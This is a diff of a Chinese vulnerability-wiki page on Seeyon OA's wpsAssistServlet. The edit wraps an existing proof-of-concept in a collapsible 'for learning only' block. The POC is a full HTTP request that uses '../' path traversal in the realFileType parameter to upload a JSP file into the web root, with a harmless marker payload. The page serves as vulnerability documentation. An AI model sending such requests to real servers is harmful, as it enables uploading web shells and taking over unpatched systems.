@@ -74,8 +74,10 @@ private Map<String, Object> oaSaveFile(HttpServletRequest request, Map<String, O
 
 `C://Seeyon/A6/base/temporary` 为默认上传的位置，但 `realFileType, fileId` 参数可控，可以通过 ../ 遍历上传到任意目录下，验证POC
 
-```
-POST /seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg.jsp&fileId=2 HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /seeyon/wpsAssistServlet?flag=save&amp;realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg.jsp&amp;fileId=2 HTTP/1.1
 Host: 
 Content-Length: 349
 Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b34616b
@@ -85,9 +87,10 @@ Accept-Encoding: gzip
 Content-Disposition: form-data; name="upload"; filename="123.xls"
 Content-Type: application/vnd.ms-excel
 
-<% out.println("seeyon_vuln");%>
---59229605f98b8cf290a7b8908b34616b--
-```
+&lt;% out.println("seeyon_vuln");%&gt;
+--59229605f98b8cf290a7b8908b34616b--</code></pre>
+
+</details>
 
 ![image-20220824142837723](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202208241428763.png)
 
